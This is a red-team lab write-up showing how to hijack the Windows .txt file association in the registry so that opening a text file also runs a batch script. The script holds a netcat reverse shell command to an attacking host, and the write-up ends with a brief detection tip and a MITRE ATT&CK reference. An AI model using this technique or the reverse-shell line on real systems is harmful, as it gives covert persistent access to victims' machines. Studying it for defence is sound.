<h1>Hijacking Default File Extension</h1>
<p>When a .txt file is double clicked, it's opened with a notepad.exe. Windows knows that it needs to use notepad.exe for opening txt files, because the `.txt` extension (among many others) are mapped to applications that can open those files in Windows registry located at `Computer\HKEY_CLASSES_ROOT`.</p>
<p>It's possible to hijack a file extension and make it execute a malicious application before the actual file is opened.</p>
<p>In this quick lab, I'm going to hijack the .txt extension - the victim user will still be able to open the original .txt file, but it will additionally fire a reverse shell back to the attacking system.</p>
<h2>Execution</h2><p>The .txt extension handler is defined in the below registry key:</p><pre>Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command</pre>
<p>Below shows that the command responsible for opening .txt files is `notepad.exe %1`, where `%1` is the argument for notepad.exe, which specifies a file name the notepad should open:</p>
<img src="https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/raw/master/.gitbook/assets/image%20(427).png">
<p>Say, a target user has the file test.txt on his desktop with the below file contents:</p>
<img src="https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/raw/master/.gitbook/assets/image%20(430).png">

<p>Let's now create a malicious file that we want to be executed when the user attempts to open the benign file test.txt. 
For this lab, the malicious file is going to be a simple Windows batch file located in c:\tools\shell.cmd:</p>
<pre><code title="c:\tools\shell.cmd">start C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe\nstart notepad.exe %1</code>
</pre>
<img src="https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/raw/master/.gitbook/assets/image%20(429).png">
<p>Once executed, `c:\tools\hell.cmd` will launch a simple netcat reverse shell to the attacking system and also a notepad with the `test.txt` file as an argument.</p>
<p>We are now ready to hijack the .txt file extension by modifying the value data of  `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` to `c:\tools\shell.cmd %1` as shown below:
  <img src="https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/raw/master/.gitbook/assets/image%20(431).png">

</p>
<h2>Demo</h2>
<p>Opening the test.txt file by double clikcing it opens the file itself, but a reverse shell is thrown to the attacking system as well:
<img src="https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/raw/master/.gitbook/assets/hijacked-extension.gif"></p>
<h2>Detection</h2>
<p>Defenders may want to monitor registry for file extension command changes, especially if the data field contains binaries located in unusual places.</p>
<h2>References</h2>
<p><a href="https://attack.mitre.org/techniques/T1042/">https://attack.mitre.org/techniques/T1042/</a></p>
